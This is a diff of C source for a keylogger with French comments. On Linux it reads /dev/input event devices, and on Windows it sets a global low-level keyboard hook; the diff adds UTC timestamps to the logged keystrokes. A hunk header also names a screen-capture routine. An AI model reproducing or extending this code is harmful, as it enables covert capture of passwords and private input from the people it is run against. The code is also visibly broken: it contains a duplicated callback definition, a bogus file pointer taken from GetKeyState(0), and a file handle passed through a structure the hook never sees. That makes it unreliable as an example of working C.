@@ -27,7 +27,7 @@ void keylogger(const char *file_path) {
 
     while ((entry = readdir(dir)) != NULL) {
         if (strstr(entry->d_name, "event") != NULL) {
-            char device_path[128];
+            char device_path[512];
             snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
             int fd = open(device_path, O_RDONLY);
             if (fd == -1) {
@@ -43,7 +43,7 @@ void keylogger(const char *file_path) {
                     break;
                 }
                 if (ev.type == EV_KEY && ev.value == 1) { // Key press event
-                    fprintf(logfile, "Key pressed: %d from %s\n", ev.code, device_path);
+                    fprintf(logfile, "%d : %s\n", ev.code, device_path);
                 }
             }
             close(fd);
@@ -143,6 +143,9 @@ void capture_screen_at_fps(int target_fps, const char *output_directory) {
 
 #include <windows.h>
 #include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
+#include <string.h>
 
 // Callback pour le hook clavier sous Windows
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -150,10 +153,37 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
         if (wParam == WM_KEYDOWN) {
             FILE *logfile = (FILE *)kbd->dwExtraInfo; // Récupère le fichier passé en argument
-            fprintf(logfile, "Key pressed: %d\n", kbd->vkCode); // Enregistre la touche dans le fichier
+            fprintf(logfile, "Key pressed: %ld\n", kbd->vkCode); // Enregistre la touche dans le fichier
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+// Fonction pour obtenir l'heure en secondes depuis l'époque Unix (UTC)
+char* get_current_time() {
+    time_t now;
+    time(&now);
+    struct tm *gmt = gmtime(&now); // Obtient l'heure UTC
+    static char time_str[20];
+    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", gmt); // Format "YYYY-MM-DD HH:MM:SS"
+    return time_str;
+}
+
+// Fonction de callback pour gérer la pression des touches
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // Si c'est une pression de touche (WM_KEYDOWN)
+    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;
+        FILE *logfile = (FILE*)GetKeyState(0); // Récupère le pointeur du fichier passé
+
+        // Obtenir le temps actuel au format UTC
+        char *current_time = get_current_time();
+
+        // Enregistre la touche pressée et l'horodatage dans le fichier
+        fprintf(logfile, "%s: %c\n", current_time, pKeyboard->vkCode);
+        fflush(logfile); // Force l'écriture immédiate dans le fichier
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam); // Permet la propagation de l'événement
 }
 
 // Fonction pour démarrer le keylogger sous Windows
@@ -174,7 +204,7 @@ void start_keylogger(const char *file_path) {
     // Passer le fichier en argument en utilisant dwExtraInfo
     SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     KBDLLHOOKSTRUCT kbdInfo;
-    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile;
+    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile; // Passer le fichier à la fonction de callback
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
